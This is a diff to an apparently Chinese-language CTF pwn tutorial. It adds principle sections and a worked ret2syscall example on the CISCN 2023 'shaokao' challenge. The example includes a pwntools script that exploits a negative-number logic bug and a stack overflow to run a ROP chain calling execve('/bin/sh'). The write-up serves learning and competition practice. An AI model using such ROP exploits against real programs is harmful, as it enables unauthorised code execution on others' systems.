@@ -7,6 +7,12 @@ comment: True
 
 ## ret2shellcode
 
+### 原理
+
+控制程序执行 shellcode 代码，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。
+
+### 例子
+
 以[HNCTF 2022 Week1]ret2shellcode为例，先**checksec**一下
 
 ![ret2shellcode-checksec](./assets/ret2shellcode-checksec.png)
@@ -41,9 +47,80 @@ p.interactive()
 
 ## ret2syscall
 
-没找到好的例题，先不写。
+### 原理
+
+控制程序执行系统调用，获取 shell。我们需要知道调用函数的对应的系统调用号和参数，接着寻找对应的寄存器构造ROPchain，例如execve函数的系统调用号为59，有3个参数，所以我们就会用到rdi,rsi,rdx三个寄存器。通常系统调用号放在**rax**寄存器中。
+
+### 例子
+
+以CISCN 2023 初赛的烧烤摊儿为例，先进行checksec
+
+![ret2syscall-checksec](./assets/ret2syscall-checksec.png)
+
+64位程序，开了NX和Canary，查看IDA
+
+![ret2syscall](./assets/ret2syscall-main.png)
+
+使用了switch写了一个菜单，分别是购买啤酒、购买串、查看余额、承包店铺、改名，发现几点
+
+- 承包店铺需要100000金币，且购买时**未检测负数输入**，可以此来增加金币
+- 改名中存在**栈溢出漏洞**，且canary保护存在但**未对rbp-8中的内容做检查**
+- 改名需要承包后才可进入
+- 程序中存在**syscall调用**
+- 改名函数中会将输入的内容放入**name**变量，可以将**/bin/sh**放入用来构造rop
+
+![ret2syscall-gaiming](./assets/ret2syscall-gaiming.png)
+
+所以可以通过逻辑漏洞承包店铺，再进入改名函数通过栈溢出执行系统调用，这里我们选择调用execve('/bin/sh',0,0)来获得shell，所以我们需要构造的rop为
+
+- 在name中放入'/bin/sh'
+- 在寄存器rax放入execve的系统调用号59
+- name的值放入rdi
+- rsi = rdx = 0
+
+使用ROPgadget寻找gedget
+
+![ret2syscall-gadget](./assets/ret2syscall-gadget.png)
+
+exp如下：
+
+~~~python
+from pwn import *
+
+context(arch='amd64',os='linux',log_level='debug')
+
+p = process("./shaokao")
+
+pop_rax = 0x458827
+pop_rdi = 0x40264f
+pop_rsi = 0x40a67e
+pop_rdx = 0x4a404b
+name_addr = 0x4e40f0
+syscall_addr = 0x402404
+
+p.sendline('1')
+p.sendline('1')
+p.sendline('-10000')
+p.sendline('4')
+p.sendline('5')
+
+payload = b'/bin/sh\x00' + b'a'*0x20 + p64(pop_rax) + p64(59) + p64(pop_rdi) + p64(name_addr) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(0) + p64(syscall_addr)
+
+p.sendline(payload)
+p.interactive()
+~~~
+
+运行结果：
+
+![ret2syscall-flag](./assets/ret2syscall-flag.png)
 
 ## ret2libc
+
+### 原理
+
+控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置。一般会选择system('/bin/sh')
+
+### 例子
 
 以CISCN 2019 东北的Pwn2为例，先**checksec**一下
 
